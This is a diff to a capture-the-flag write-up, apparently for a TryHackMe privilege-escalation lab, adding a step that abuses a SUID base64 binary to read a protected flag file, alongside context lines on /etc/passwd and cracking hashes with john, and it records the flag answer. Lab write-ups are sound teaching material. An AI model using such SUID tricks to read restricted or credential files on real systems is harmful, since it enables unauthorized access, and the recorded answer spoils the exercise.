@@ -205,7 +205,9 @@ Once our user is added (please note how root:/bin/bash was used to provide a roo
 
 ![image](https://user-images.githubusercontent.com/90561566/196024937-2f8a604d-9998-495c-901b-1066760a6e1e.png)
 
-back to task
+back to task, we can see base64 is running as suid
+
+![image](https://user-images.githubusercontent.com/90561566/196069204-e200f05f-fad7-40b1-972e-c83560160c2c.png)
 
 ```
 cat /etc/passwd
@@ -237,7 +239,17 @@ john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
 
 ![image](https://user-images.githubusercontent.com/90561566/196068630-0227b7d3-bc22-47b9-9da2-84db2dcbeac1.png)
 
+We can use the same trick to see flag3
 
+```
+base64 /home/ubuntu/flag3.txt | base64 --decode
+```
+
+![image](https://user-images.githubusercontent.com/90561566/196069314-cc38d458-3441-43b5-ba99-c5d0abda009b.png)
+
+| Flag | flag3.txt |
+| --- | --- |
+| Answer | THM-3847834 |
 
 
 
